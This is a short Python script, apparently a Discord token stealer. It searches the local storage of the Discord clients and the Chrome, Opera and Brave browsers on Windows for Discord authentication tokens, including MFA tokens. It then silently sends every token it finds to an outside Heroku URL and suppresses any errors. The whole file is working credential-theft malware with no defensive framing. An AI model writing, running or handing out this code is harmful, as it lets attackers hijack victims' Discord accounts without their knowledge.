import os
import re
import json
import requests
URL = 'https://quintex.herokuapp.com/tokens'
tokens = []
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
paths = {
    'discord': roaming + '\\Discord',
    'canary': roaming + '\\discordcanary',
    'ptb': roaming + '\\discordptb',
    'chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
}
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    ptokens = find_tokens(path)
    if len(ptokens)>0:
        for t in ptokens:
            tokens.append(t)
        
payload = json.dumps({
    "tokens": tokens,
})
try:
    requests.post(URL , data=payload.encode('utf-8'))
except:
    pass